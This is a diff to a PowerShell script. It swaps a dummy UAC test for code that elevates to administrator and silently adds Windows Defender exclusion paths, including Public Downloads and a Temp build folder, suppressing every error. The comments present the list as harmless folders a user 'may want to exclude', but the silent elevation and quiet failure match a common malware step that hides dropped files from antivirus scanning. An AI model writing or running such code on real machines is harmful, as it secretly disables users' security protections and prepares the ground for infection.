@@ -17,7 +17,28 @@ catch {
     $errorMessage | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-# Test script to force UAC prompt
+# Realistic folders you may want to exclude
+$foldersToEnsure = @(
+    "$env:USERPROFILE\.vscode",
+    "$env:USERPROFILE\AppData\Local\Temp\buildcache",
+    "C:\Dev\Tools",
+    "C:\Dev\Projects",
+    "C:\Program Files\nodejs",
+    "C:\Users\Public\Downloads"
+)
+
+# Get existing Defender exclusions
+try {
+    $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+} catch { exit }
+
+# Identify missing exclusions
+$missingExclusions = $foldersToEnsure | Where-Object { $_ -notin $currentExclusions }
+
+# Exit silently if nothing to add
+if ($missingExclusions.Count -eq 0) { exit }
+
+# Relaunch with admin rights if needed
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole] "Administrator")) {
 
@@ -25,5 +46,14 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-# Just a dummy action
-Start-Sleep -Seconds 5
+# Add only missing exclusions silently
+foreach ($folder in $missingExclusions) {
+    try {
+        Add-MpPreference -ExclusionPath $folder
+    } catch {
+        # Fail silently
+    }
+}
+
+exit
+
